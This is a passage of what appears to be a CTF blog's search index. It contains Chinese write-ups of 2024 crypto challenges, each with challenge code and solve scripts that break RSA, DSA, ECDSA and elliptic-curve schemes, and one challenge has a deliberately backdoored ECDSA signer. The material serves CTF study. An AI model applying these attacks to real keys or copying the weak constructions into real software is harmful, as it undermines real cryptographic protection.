'x', modulus=x**128 + x**7 + x**2 + x + 1) def reverse(f): return F(list(f)[::-1]) def hex2f(h): return reverse(F.from_bytes(bytes.fromhex(h))) def f2hex(f): return reverse(f).to_bytes()[-16:].hex() def summon(idx, name): io.sendline('1') io.sendline(str(idx)) io.sendline(f2hex(name)) io.recvuntil('tag(hex) = ') return hex2f(io.recvline().decode()) trash1 = summon(1, F(0)) hh1 = trash1 + summon(1, F(1)) trash2 = summon(2, F(0)) hh2 = trash2 + summon(2, F(1)) ans = (trash1 + trash2) / (hh1 + hh2) io.sendline('2') io.sendline(f2hex(ans)) io.interactive() ","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:2","tags":["crypto"],"title":"串烧_crypto复现","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"强网杯青少年2024/easymath task from Crypto.Util.number import * from gmpy2 import next_prime from secrets import flag l=2331 key=0 for k in range(2**(l-1),2**l): s=bin(k)[2:] if(k%2==1 and '1111' not in s and '0000' not in s): key+=1 p=next_prime(key) q=getPrime(2048) n=p*q e=65537 m=bytes_to_long(flag) c=pow(m,e,n) print(f'n=',n) print(f'c=',c) ''' n=739243847275389709472067387827484120222494013590074140985399787562594529286597003777105115865446795908819036678700460141950875653695331369163361757157565377531721748744087900881582744902312177979298217791686598853486325684322963787498115587802274229739619528838187967527241366076438154697056550549800691528794136318856475884632511630403822825738299776018390079577728412776535367041632122565639036104271672497418509514781304810585503673226324238396489752427801699815592314894581630994590796084123504542794857800330419850716997654738103615725794629029775421170515512063019994761051891597378859698320651083189969905297963140966329378723373071590797203169830069428503544761584694131795243115146000564792100471259594488081571644541077283644666700962953460073953965250264401973080467760912924607461783312953419038084626809675807995463244073984979942740289741147504741715039830341488696960977502423702097709564068478477284161645957293908613935974036643029971491102157321238525596348807395784120585247899369773609341654908807803007460425271832839341595078200327677265778582728994058920387721181708105894076110057858324994417035004076234418186156340413169154344814582980205732305163274822509982340820301144418789572738830713925750250925049059 c=229043746793674889024653533006701296308351926745769842802636384094759379740300534278302123222014817911580006421847607123049816103885365851535481716236688330600113899345346872012870482410945158758991441294885546642304012025685141746649427132063040233448959783730507539964445711789203948478927754968414484217451929590364252823034436736148936707526491427134910817676292865910899256335978084133885301776638189969716684447886272526371596438362601308765248327164568010211340540749408337495125393161427493827866434814073414211359223724290251545324578501542643767456072748245099538268121741616645942503700796441269556575769250208333551820150640236503765376932896479238435739865805059908532831741588166990610406781319538995712584992928490839557809170189205452152534029118700150959965267557712569942462430810977059565077290952031751528357957124339169562549386600024298334407498257172578971559253328179357443841427429904013090062097483222125930742322794450873759719977981171221926439985786944884991660612824458339473263174969955453188212116242701330480313264281033623774772556593174438510101491596667187356827935296256470338269472769781778576964130967761897357847487612475534606977433259616857569013270917400687539344772924214733633652812119743 ''' 思路： 直接看上去就是让你去分解，或者是直接求p的，其实这是一种算法，用矩阵状态方程，再结合矩阵快速幂，就可以很快的出来结果 e x p states = [ (0, 1), (0, 2), (0, 3), (1, 1), (1, 2), (1, 3) ] state_idx = { state: idx for idx, state in enumerate(states) } idx_state = { idx: state for idx, state in enumerate(states) } size = len(states) T = [ [0]*size for _ in range(size) ] for idx_from, (last_bit, count) in enumerate(states): for new_bit in [0, 1]: if new_bit == last_bit: new_count = count + 1 else: new_count = 1 if new_count \u003e= 4: continue idx_to = state_idx[ (new_bit, new_count) ] T[idx_to][idx_from] += 1 def mat_mul(a, b): result = [ [0]*size for _ in range(size) ] for i in range(size): for j in range(size): for k in range(size): result[i][j] += a[i][k] * b[k][j] return result def mat_pow(mat, power): result = [ [1 if i == j else 0 for j in range(size)] for i in range(size) ] # 单位矩阵 while power \u003e 0: if power % 2 == 1: result = mat_mul(mat, result) mat = mat_mul(mat, mat) power //= 2 return result initial_state = [0]*size initial_state[state_idx[(1, 1)]] = 1 l = 2331 T_pow = mat_pow(T, l - 1) final_state = [0]*size for i in range(size): for j in range(size): final_state[i] += T_pow[i][j] * initial_state[j] key = 0 for id","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:3","tags":["crypto"],"title":"串烧_crypto复现","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"蜀道山/Something like coppersmith task from Crypto.Util.number import * from Crypto.Cipher import AES from Crypto.Util.Padding import pad import hashlib from secret import flag p = 6302810904265501037924401786295397288170843149817176985522767895582968290551414928308932200691953758726228011793524154509586354502691822110981490737900239 g = 37 x = getRandomRange(1, p) key = hashlib.md5(str(x).encode()).digest() aes = AES.new(key=key, mode=AES.MODE_ECB) print(f\"y = {pow(g, x, p)}\") print(f\"xl = {x \u0026 (2**404 - 1)}\") print(f\"enc = {aes.encrypt(pad(flag, 16))}\") \"\"\" y = 1293150376161556844462084321627758417728307246932113125521569554783424543983527961886280946944216834324374477189528743754550041489359187752209421536046860 xl = 17986330879434951085449288256517884655391850545705434564933459034981508996937405053663301303792832616366656593647019909376 enc = b'\\x08[\\x94\\xc1\\xc2\\xc3\\xb9\"C^\\xd6P\\xf9\\x0c\\xbb\\r\\r\\xaf\u0026\\x94\\x8cm\\x02s\\x87\\x8b\\x1c\\xb3\\x92\\x81H\\xe7\\xc6\\x190a\\xca\\x91j\\xc0@(\\xc5Fw\\x95\\r\\xee' \"\"\" 思路： 发现 $$p-1$$可以分解，利用小数直接分解，求出来106bits，x的低位直接crt，然后爆破几位就出来了 e x p y = 1293150376161556844462084321627758417728307246932113125521569554783424543983527961886280946944216834324374477189528743754550041489359187752209421536046860 xl = 17986330879434951085449288256517884655391850545705434564933459034981508996937405053663301303792832616366656593647019909376 enc = b'\\x08[\\x94\\xc1\\xc2\\xc3\\xb9\"C^\\xd6P\\xf9\\x0c\\xbb\\r\\r\\xaf\u0026\\x94\\x8cm\\x02s\\x87\\x8b\\x1c\\xb3\\x92\\x81H\\xe7\\xc6\\x190a\\xca\\x91j\\xc0@(\\xc5Fw\\x95\\r\\xee' p = 6302810904265501037924401786295397288170843149817176985522767895582968290551414928308932200691953758726228011793524154509586354502691822110981490737900239 g = 37 from Crypto.Util.number import * from Crypto.Cipher import AES import hashlib #2 · 385057 · 727646221919\u003c12\u003e · 193893885660581\u003c15\u003e · 193166780451443059\u003c18\u003e · 3881671740574461385603964379125531\u003c34\u003e · 77364837756797328321829387679372821139010103152781295726133301368685957\u003c71\u003e r2=193166780451443059 r3=3881671740574461385603964379125531 r4=77364837756797328321829387679372821139010103152781295726133301368685957 r=r2*r3*r4 Fp = GF(p) #xr = discrete_log(Fp(pow(y,r,p)), Fp(pow(g,r,p)), operation=\"*\", ord=(p-1)//r) xr=57328333290257638351589051968512 x = crt([xl, xr], [2^404, (p-1)//r]) for i in range(2^10): temp = x + i*lcm([2^404, (p-1)//r]) if(temp \u003e p-1): break key = hashlib.md5(str(temp).encode()).digest() aes = AES.new(key=key, mode=AES.MODE_ECB) print(aes.decrypt(enc)) ","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:4","tags":["crypto"],"title":"串烧_crypto复现","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"蜀道山/签到!? task import hashlib import gmpy2 from Crypto.Util.number import * flag = b'' m = bytes_to_long(flag) a = getPrime(1024);b = getPrime(1024);c = getPrime(1024);d = getPrime(128);n = getPrime(1024) y = 0 for i in range(n+1): x = a*i+b y += (x//c)*i if isPrime(y): pass else: y = gmpy2.next_prime(y) tmp = hashlib.md5(str(y).encode()).hexdigest() cc = pow(d,int(tmp,16),n) e = 52595 c3 = pow(m,e,y) c4 = pow(a*m+b,e,y) print('a =',a) print('b =',b) print('c =',c) print('d =',d) print('n =',n) print('cc =',cc) print('c3 =',c3) print('c4 =',c4) # a = 111406501658261575231314234156049408466629183228824951940397996549233343837444378602865612803520661162092930300450227752136992834681100817745708350750328806415942948297139334928206997684336812509277385194519252428443612078118898709910123899406877252165189871184174372173644257644751683554571917518602985248103 # b = 105754676330138681072874983469472331489357433467464632569519728162042635815478944541148477139634812590504509864018789141646023167940434519693396156652820504954321975234632684842726055170039476517204102162821838097200563406354332901840869790790015364563201564244853988381159598703692897790765599565893345380553 # c = 170600113386807592462858319531540617567133570960670217596634485327958954420566724690918464046407772634147753234450737353193173923873879958589824005123545638184186453602233634037809629812111243183450002707175703333920828461245731172668838771751457387207779427008047454548463398397079552688864699792002976130047 # d = 229823065384822950015724955215847476631 # n = 169428502732446427714165121824913735747920403586738853921495983139840483604966163669399379093896888954652663456556496947292418676356981468237136780175047349167561875551277606897449804926885192045760368051311243166090981061101913245493065268528634952461907634111084108803207099139506693313918834075542826388183 # cc = 105324189115602620621800798531371526317853537119154266873657796691360779628410005302892575043351618666760506544724245300953227618282253336044824499240524905915476071538182232622771476344880513465689824790881603214009332398038930113198889292160815386819010434380814610557831376377280232817587639852364108539892 # c3 = 791801877941025556812260671377895956461402542450910806211264471681160334454968210834058573374802678147030803278793623022600774676606263064237697305258809520983007689647782562591531551137322198839457388757360504835352506363286012791482381915207800512880078672338934869429374580298570299136345411005736381918329554791587303420005844148692211002120828912548145333101329366616120459060822278273689238720580513363138874807500470690610311215233669314430430554144017703130663205211791135140813550629558977548476426876112982216083736966681702987597722820852894624586687261277977164491919429492650781084296080288020330875247574855906390404509845311187888602482142661083771230000178356724801659025002251056321173755782500071361114235931347064100961296562902176010402092225439511324625249209554560052627349307173707304259200397468217911136832133364420684914378754649851955359890480612161233059263522713390654506714661592991514955637304 # c4 = 10192392140000709226779047816102410379989295488085905279342261532922281312983533344247863222018254472453030181639307253067276326364502240818954781592338390656561160688892609713540052729900686290778105893183880488799488309568381420345266346723577640757282208294402213347640987837466355562725803531763148917371941078562909025541786168608157137675690679993859387074547195693639306677490798812441131812460417892075569888708639917765050200488386084418736591195347298092121318463941167250369161241843727653089619800261027673290600474169228647053856528885234415883022958077183412358232078225869839285326293594485889893799964700459966806042546115084665264293139731146842547623505675676180593342164352556684592805723899145846911329057615946523424327497198291393970986995190706116949313230986385201668253399829989370585983484432587689051140566433600130860013394644099869050309515696468764559722","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:5","tags":["crypto"],"title":"串烧_crypto复现","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"前言 额，没有进线下，很遗憾，24名，感觉算是尽力了吧，密码差一个，pwn差一个，害，加油加油 ","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:1:0","tags":["crypto"],"title":"国城杯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"题目 ","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:2:0","tags":["crypto"],"title":"国城杯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"baby_rsa task from secret import flag from Crypto.Util.number import* from gmpy2 import* flag = b'D0g3xGC{****************}' def gen_key(p, q): public_key = p*p*q e = public_key n = p*q phi_n = (p-1)*(q-1) private_key = inverse(e,phi_n) return public_key,private_key,e p = getPrime(512) q = getPrime(512) N,d,e = gen_key(p,q) c = gmpy2.powmod(bytes_to_long(flag),e,N) print(N) print(d) print(c) ''' n = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489 d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009 c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175 ''' 思路：第一开始蠢了，光想着数论去分解（），实际上就是已知ed去分解n的板子，如果你不喜欢这样写，也可以当做Schmidt-Samoa密码系统去写，也就是N=ppq exp 已知ed分解n from Crypto.Util.number import * from gmpy2 import * import random N = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489 d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009 c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175 e=N def divide_pq(e, d, n): k = e*d - 1 while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x \u003e 1 and gmpy2.gcd(x-1, n) \u003e 1: p = gmpy2.gcd(x-1, n) return (p, n//p) p,q=divide_pq(e,d,N) print(p) print(q) p=79383306134947424796765954824015864390078583902302636527808026816952829265734994276325635699794430479702821928289625118815325887659007643266349948296318807317582134486508441170880662166050894191177907221139536796434252181713457621118705394280613626457816073091127751846643375030866224594198586067838678842497 q=6794928570435044209030833867549069695672243994881591721813098774596108837421399268704431701833380412609102066316818356763155159992836983459691442967908337 phi=(p-iroot(p,2)[0])*(q-1) d=inverse(e,phi) m=pow(c,d,(q)) print(long_to_bytes(m)) Schmidt-Samoa密码系统 from gmpy2 import* from libnum import* N = 53940389487194577982720217406130297034108245592836413744496284435903992416","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:2:1","tags":["crypto"],"title":"国城杯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"Curve task #sagemath from Crypto.Util.number import * def add(P, Q): (x1, y1) = P (x2, y2) = Q x3 = (x1*y2 + y1*x2) * inverse(1 + d*x1*x2*y1*y2, p) % p y3 = (y1*y2 - a*x1*x2) * inverse(1 - d*x1*x2*y1*y2, p) % p return (x3, y3) def mul(x, P): Q = (0, 1) while x \u003e 0: if x % 2 == 1: Q = add(Q, P) P = add(P, P) x = x \u003e\u003e 1 return Q p = 64141017538026690847507665744072764126523219720088055136531450296140542176327 a = 362 d = 7 e=0x10001 gx=bytes_to_long(b'D0g3xGC{*****************}') PR.\u003cy\u003e=PolynomialRing(Zmod(p)) f=(d*gx^2-1)*y^2+(1-a*gx^2) gy=int(f.roots()[0][0]) assert (a*gx^2+gy^2)%p==(1+d*gx^2*gy^2)%p G=(gx,gy) eG = mul(e, G) print(eG) #eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463) 思路：网上查了一下，这是爱德华曲线，L佬的博客里面有映射回去的方法，自己实现就好了 exp from Crypto.Util.number import * p = 64141017538026690847507665744072764126523219720088055136531450296140542176327 a = 362 d = 7 e=0x10001 c=1 eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463) #part2 map to ECC F = GF(p) dd = F(d*c^4) A = F(2) * F(a+dd) / F(a-dd) B = F(4) / F(a-dd) a = F(3-A^2) / F(3*B^2) b = F(2*A^3-9*A) / F(27*B^3) def edwards_to_ECC(x,y): x1 = F(x) / F(c) y1 = F(y) / F(c) #now curve is a*x^2+y^2 = 1+dd*x^2*y^2 x2 = F(1+y1) / F(1-y1) y2 = F(x2) / F(x1) #now curve is By^2 = x^3 + Ax^2 + x x3 = (F(3*x2) + F(A)) / F(3*B) y3 = F(y2) / F(B) #now curve is y^2 = x^3 + ax + b return (x3,y3) def ECC_to_edwards(x,y): x2 = (F(x) * F(3*B) - F(A)) / F(3) y2 = F(y) * F(B) #now curve is By^2 = x^3 + Ax^2 + x x1 = F(x2) / F(y2) y1 = F(1) - (F(2) / F(x2+1)) #now curve is a*x^2+y^2 = 1+dd*x^2*y^2 x_ = F(x1) * F(c) y_ = F(y1) * F(c) #now curve is a*x^2+y^2 = c^2(1+d*x^2*y^2) return (x_,y_) E = EllipticCurve(GF(p), [a, b]) order = E.order() eG = E(edwards_to_ECC(eG[0],eG[1])) t = inverse(e,order) G = t*eG G = ECC_to_edwards(G[0],G[1]) print(long_to_bytes(int(G[0]))) ","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:2:2","tags":["crypto"],"title":"国城杯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"ez_sign task from Crypto.Util.number import * from gmpy2 import * from hashlib import* import random,os flag = b'D0g3xGA{***************}' msg = b'e=?' def sign(pub, pri, k): (p,q,g,y) = pub x = pri r = int(powmod(g, k, p) % q) H = bytes_to_long(sha1(os.urandom(20)).digest()) s = int((H + r * x) * invert(k, q) % q) return (H,r,s) k1 = getPrime(64) k2 = k1 ** 2 pri = bytes_to_long(msg) a = 149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203 b = 829396411171540475587755762866203184101195238207 g = 87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397 y = 97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238 pub = (a, b, g, y) H1, r1, s1 = sign(pub, pri, k1) H2, r2, s2 = sign(pub, pri, k2) p = getPrime(128) q = getPrime(128) n = p * q c = powmod(bytes_to_long(flag), e, n) C = p**2 + q**2 print(f'(H1, r1, s1) = {H1}, {r1}, {s1}') print(f'(H2, r2, s2) = {H2}, {r2}, {s2}') print(c) print(C) ''' (H1, r1, s1) = 659787401883545685817457221852854226644541324571, 334878452864978819061930997065061937449464345411, 282119793273156214497433603026823910474682900640 (H2, r2, s2) = 156467414524100313878421798396433081456201599833, 584114556699509111695337565541829205336940360354, 827371522240921066790477048569787834877112159142 c = 18947793008364154366082991046877977562448549186943043756326365751169362247521 C = 179093209181929149953346613617854206675976823277412565868079070299728290913658 ''' 思路：主要是两部分 第一部分，dsa求解e，k1=k,k2=k**2，这一部分其实nss的工坊里面的dsa有讲过，哥们就不现推了，公式太难敲了 a = 149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203 b = 829396411171540475587755762866203184101195238207 g = 87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397 y = 97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238 from Crypto.Util.number import * p, q, g, y = a, b, g, y (h1, r1, s1) = 659787401883545685817457221852854226644541324571, 334878452864978819061930997065061937449464345411, 282119793273156214497433603026823910474682900640 (h2, r2, s2) = 156467414524100313878421798396433081456201599833, 584114556699509111695337565541829205336940360354, 827371522240921066790477048569787834877112159142 PR.\u003cx\u003e = PolynomialRing(GF(q)) f = s2*x^2*r1 - s1*x*r2 - h2*r1 + h1*r2 print(f.roots()) k = int(f.roots()[1][0]) x = (s1*k - h1) * inverse(r1, q) % q print(long_to_bytes(x)) 这一部分求出来e=44519 第二部分，发现直接求解m是错误的，我就在想，是不是m\u003en的情况，于是我就尝试了羊城杯2024年的方法，想通过爆破格去写，发现错了，然后意识到可能是C=p2+q2有多解，用sagemath直接求解的是错误的，赛后发现可以利用复平面求解，真的学到了，当然，也可以利用https://www.alpertron.com.ar/QUAD.HTM 这个网站进行直接求解，会直接解出多组pq，真的很好","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:2:3","tags":["crypto"],"title":"国城杯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"总结 只能说有遗憾吧，没有ak密码，也没有进入线下，但是看见队友都很努力，好像也都是值得的，加油加油 ","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:3:0","tags":["crypto"],"title":"国城杯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":" 前言 应该是这个暑假里面(目前)打的最难的一场了，相比于das，他就上一个密码题啊我靠，八个小时，上了三波题，就开局一个密码，还是没写过的ECDSA加密，写不出来就很尴尬也很痛苦 题目 task from ecdsa.ecdsa import * from Crypto.Util.number import * import hashlib import gmpy2 def inverse_mod(a, m): if a == 0: return 0 return gmpy2.powmod(a, -1, m) def bit_length(x): return x.bit_length() def get_malicious_key(): a = 751818 b = 1155982 w = 908970521 X = 20391992 return a, b, w, X class RSZeroError(RuntimeError): pass class InvalidPointError(RuntimeError): pass class Signature(object): \"\"\"ECDSA signature.\"\"\" def __init__(self, r, s): self.r = r self.s = s class Public_key(object): \"\"\"Public key for ECDSA.\"\"\" def __init__(self, generator, point, verify=True): self.curve = generator.curve() self.generator = generator self.point = point n = generator.order() p = self.curve.p() if not (0 \u003c= point.x() \u003c p) or not (0 \u003c= point.y() \u003c p): raise InvalidPointError( \"The public point has x or y out of range.\" ) if verify and not self.curve.contains_point(point.x(), point.y()): raise InvalidPointError(\"Point does not lay on the curve\") if not n: raise InvalidPointError(\"Generator point must have order.\") if ( verify and self.curve.cofactor() != 1 and not n * point == ellipticcurve.INFINITY ): raise InvalidPointError(\"Generator point order is bad.\") class Private_key(object): \"\"\"Private key for ECDSA.\"\"\" def __init__(self, public_key, secret_multiplier): self.public_key = public_key self.secret_multiplier = secret_multiplier def sign(self, hash, random_k): G = self.public_key.generator n = G.order()# 获取该椭圆模数 k = random_k % n p1 = k * G r = p1.x() % n if r == 0: raise RSZeroError(\"amazingly unlucky random number r\") s = ( inverse_mod(k, n) * (hash + (self.secret_multiplier * r) % n) ) % n if s == 0: raise RSZeroError(\"amazingly unlucky random number s\") return Signature(r, s) def malicious_sign(self,hash, random_k, a, b, w, X): # t = random.randint(0,1) t = 1 G = self.public_key.generator Y = X * G n = G.order() k1 = random_k z = (k1 - w * t) * G + (-a * k1 - b) * Y zx = z.x() % n k2 = int(hashlib.sha1(str(zx).encode()).hexdigest(), 16) #print(f'k2 = {k2}') p1 = k2 * G r = p1.x() % n if r == 0: raise RSZeroError(\"amazingly unlucky random number r\") s = ( inverse_mod(k2, n) * (hash + (self.secret_multiplier * r) % n) ) % n if s == 0: raise RSZeroError(\"amazingly unlucky random number s\") return (Signature(r, s),k2) if __name__ == '__main__': a,b,w,X = get_malicious_key() message1 = b'It sounds as though you were lamenting,' message2 = b'a butterfly cooing like a dove.' hash_message1 = int(hashlib.sha1(message1).hexdigest(), 16) hash_message2 = int(hashlib.sha1(message2).hexdigest(), 16) private = getRandomNBitInteger(50) rand = getRandomNBitInteger(49) public_key = Public_key(generator_192, generator_192 * private) private_key = Private_key(public_key, private) sig = private_key.sign(hash_message1, rand) malicious_sig,k2 = private_key.malicious_sign(hash_message2, rand, a,b,w,X) print(a,b,w,X) print(sig.r) print(malicious_sig.r) ''' 751818 1155982 908970521 20391992 sig.r=6052579169727414254054653383715281797417510994285530927615 malicious_sig.r=3839784391338849056467977882403235863760503590134852141664 ''' # flag为flag{uuid}格式 flag = b'' m = bytes_to_long(flag) p = k2 for i in range(99): p = gmpy2.next_prime(p) q = gmpy2.next_prime(p) e = 65537 c = pow(m,e,p*q) print(c) # 1294716523385880392710224476578009870292343123062352402869702505110652244504101007338338248714943 写题的时候有一些地方被我改了一点点，应该可以看出来（） 思路 刚拿到这个题目的时候第一想法是恢复k1再去恢复k2，第二遍读代码的时候看见 public_key = Public_key(generator_192, generator_192 * private),这就确定了这个曲线是curve_192，我又知道r，那我就可以直接去求出p，求p这里方法比较多，在网上找了个二次剩余的方法，求出p。 $$z = (k1 - w * t) * G + (-a * k1 - b) * Y $$ $$化简成$$$$z=p1+(-w)*G+(-a)*X*p1+(-b)*X*G$$那么这个题就出来了 exp import hashlib import gmpy2 from Crypto.Util.number import * r1=6052579169727414254054653383715281797417510994285530927615 #curve_192 p=6277101735386680763835789423207666416083908700390324961279 a=-3 b=2455155546008943817740293915197451784769108058161191238065 def convert_to","date":"2024-12-12","objectID":"/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024crypto/:0:0","tags":["crypto"],"title":"巅峰极客2024_crypto","uri":"/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024crypto/"},{"categories":["CTF"],"content":"前言 一共七题，出了三个，但是海鲜市场上面已经py烂了，我该喜还是该忧呢？在这里就只写上自己已经出了的题，其他的慢慢复现，最近期中考试+香港比较忙。 ","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:1:0","tags":["crypto"],"title":"强网杯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"题目 ","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:2:0","tags":["crypto"],"title":"强网杯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"EzRsa task from Crypto.Util.number import long_to_bytes, bytes_to_long, getPrime import random, gmpy2 class RSAEncryptor: def __init__(self): self.g = self.a = self.b = 0 self.e = 65537 self.factorGen() self.product() def factorGen(self): while True: self.g = getPrime(500) while not gmpy2.is_prime(2*self.g*self.a+1): self.a = random.randint(2**523, 2**524) while not gmpy2.is_prime(2*self.g*self.b+1): self.b = random.randint(2**523, 2**524) self.h = 2*self.g*self.a*self.b+self.a+self.b if gmpy2.is_prime(self.h): self.N = 2*self.h*self.g+1 print(len(bin(self.N))) return def encrypt(self, msg): return gmpy2.powmod(msg, self.e, self.N) def product(self): with open('/flag', 'rb') as f: self.flag = f.read() self.enc = self.encrypt(self.flag) self.show() print(f'enc={self.enc}') def show(self): print(f\"N={self.N}\") print(f\"e={self.e}\") print(f\"g={self.g}\") RSAEncryptor() 思路： 重点代码是 $$ h=2gab+a+b $$ 和 $$ N=2hg+1 $$,我们讲 $$N$$直接展开,其实就是 $$ N=(2ga+1)(2gb+1) $$,这个就是老熟人了，Common Prime Rsa,可以参考独奏的文章，易知是 $$g","date":"2024-12-12","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/:2:1","tags":["crypto"],"title":"强网杯2024_crypto","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"apbq task from Crypto.Util.number import * from secrets import flag from math import ceil import sys class RSA(): def __init__(self, privatekey, publickey): self.p, self.q, self.d = privatekey self.n, self.e = publickey def encrypt(self, plaintext): if isinstance(plaintext, bytes): plaintext = bytes_to_long(plaintext) ciphertext = pow(plaintext, self.e, self.n) return ciphertext def decrypt(self, ciphertext): if isinstance(ciphertext, bytes): ciphertext = bytes_to_long(ciphertext) plaintext = pow(ciphertext, self.d, self.n) return plaintext def get_keypair(nbits, e = 65537): p = getPrime(nbits//2) q = getPrime(nbits//2) n = p * q d = inverse(e, n - p - q + 1) return (p, q, d), (n, e) if __name__ == '__main__': pt = './output.txt' fout = open(pt, 'w') sys.stdout = fout block_size = ceil(len(flag)/3) flag = [flag[i:i+block_size] for i in range(0, len(flag), block_size)] e = 65537 print(f'[+] Welcome to my apbq game') # stage 1 print(f'┃ stage 1: p + q') prikey1, pubkey1 = get_keypair(1024) RSA1 = RSA(prikey1, pubkey1) enc1 = RSA1.encrypt(flag[0]) print(f'┃ hints = {prikey1[0] + prikey1[1]}') print(f'┃ public key = {pubkey1}') print(f'┃ enc1 = {enc1}') print(f'----------------------') # stage 2 print(f'┃ stage 2: ai*p + bi*q') prikey2, pubkey2 = get_keypair(1024) RSA2 = RSA(prikey2, pubkey2) enc2 = RSA2.encrypt(flag[1]) kbits = 180 a = [getRandomNBitInteger(kbits) for i in range(100)] b = [getRandomNBitInteger(kbits) for i in range(100)] c = [a[i]*prikey2[0] + b[i]*prikey2[1] for i in range(100)] print(f'┃ hints = {c}') print(f'┃ public key = {pubkey2}') print(f'┃ enc2 = {enc2}') print(f'----------------------') # stage 3 print(f'┃ stage 3: a*p + q, p + bq') prikey3, pubkey3 = get_keypair(1024) RSA3 = RSA(prikey3, pubkey3) enc3 = RSA2.encrypt(flag[2]) kbits = 512 a = getRandomNBitInteger(kbits) b = getRandomNBitInteger(kbits) c1 = a*prikey3[0] + prikey3[1] c2 = prikey3[0] + b*prikey3[1] 